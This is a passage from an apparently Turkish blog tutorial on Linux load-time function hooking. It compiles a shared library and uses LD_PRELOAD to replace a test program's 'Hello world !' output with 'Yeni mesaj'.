&lt;p&gt;Ondan öncesinde tüm bu kütüphanenin bütün kodlarını isteyen olursa : &lt;a href=&quot;https://pastebin.com/RwB0RzXm&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Burada ki pastebin linkinden ulaşabilir bu yukarıda anlatılan tüm kodların birleşimine.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;kütüphanenin-derlenmesi-ve-ld_preloada-aktarılması&quot;&gt;Kütüphanenin derlenmesi ve LD_PRELOAD’a aktarılması&lt;/h1&gt;

&lt;p&gt;Temiz bir şekilde derlemek için alttaki gcc parametreleriyle beraber kullanmamız gerekiyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc libornek.c -o libornek.so -fPIC -shared -ldl -D_GNU_SOURCE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Derlemeden sonra klasörünüze &lt;strong&gt;libornek.so&lt;/strong&gt; adında bir kütüphane eklenecektir.&lt;/p&gt;

&lt;p&gt;Şimdi bu yazdığımız kütüphaneyi &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine atıp önceden yazdığımız &lt;strong&gt;ornek.c&lt;/strong&gt; yazılımını manipule etmemiz için alttaki komut satırında gerçekleştirdiğim işlemi yapınız.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ ls
libornek.c  libornek.so  ornek  ornek.c
remnux@remnux:~/hoq$ pwd
/home/remnux/hoq
remnux@remnux:~/hoq$ export LD_PRELOAD=&quot;/home/remnux/hoq/libornek.so&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Export ile &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine kütüphanemizi aktardığımıza göre bu ortam değişkeninin ne olduğundan bahsedebiliriz.&lt;/p&gt;

&lt;p&gt;Bu ortam değişkeni yani &lt;strong&gt;enviroment variablesi&lt;/strong&gt; linux içerisinde çoook meşhurdur. Hani bahsetmiştik ya bir yazılım çalıştırdığımız da o yazılım önce &lt;strong&gt;(Library, Memory Regions)&lt;/strong&gt; gibi bölümleri yükler diye.&lt;/p&gt;

&lt;p&gt;İşte bu &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkeni çalışan yazılımın başladığı anda bizim verdiğimiz kütüphaneyi içine almasını sağlıyor böyleliklede yazılımları manipule edebiliyoruz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LD_PRELOAD&lt;/strong&gt; değişkenine kütüphanemiz atanmadan önce &lt;strong&gt;ornek.c&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pastebin.com/dKF6DVrU&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Atandıktan sonra :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pastebin.com/6vnbTiR5&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Aradaki farkı incelersek görebiliriz ki :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x7ffff7bd8000     0x7ffff7bd9000     0x1000        0x0 /home/remnux/hoq/libornek.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LD_PRELOAD&lt;/strong&gt; ortam değişkenine libornek.so atandıktan sonra &lt;strong&gt;ornek.c&lt;/strong&gt; yazılımı içerisinede her çalışmada enjekte oluyor.&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
&lt;p&gt;Tüm bu olanlardan öncesi ve sonrasında ne değiştiğini görmek istersek şayet :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ornek.c&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

  puts(&quot;Hello world !&quot;);

}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Burada puts “Hello World” yazdır demesine rağmen içerisine enjekte ettiğimiz kütüphane bunu manipule ediyor ve biz bunu çalıştırmak istediğimiz de “Hello World” yerine oluşturduğumuz &lt;strong&gt;libornek.c&lt;/strong&gt; kütüphanesinde yaptığımız manipule teknikleri ile eklediğimiz “Yeni Mesaj” çıktısı geliyor.&lt;/p&gt;

&lt;p&gt;Öncesi  :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ ./ornek
Hello world !
remnux@remnux:~/hoq$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Function hooking işlemini yazdığımız kütüphaneyi &lt;strong&gt;LD_PRELOAD&lt;/strong&gt;‘a attıktan sonrası:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remnux@remnux:~/hoq$ export LD_PRELOAD=&quot;/home/remnux/hoq/libornek.so&quot;
remnux@remnux:~/hoq$ ./ornek
Yeni mesaj
remnux@remnux:~/hoq$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Umarım yazıyı beğenmişsinizdir ve açıklayabilmişimdir &lt;strong&gt;Function Hooking&lt;/strong&gt;, &lt;strong&gt;Load-Time&lt;/strong&gt;, &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; vs.. gibi terimleri. İyi günler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux Load-Time Function Hooking</summary></entry></feed>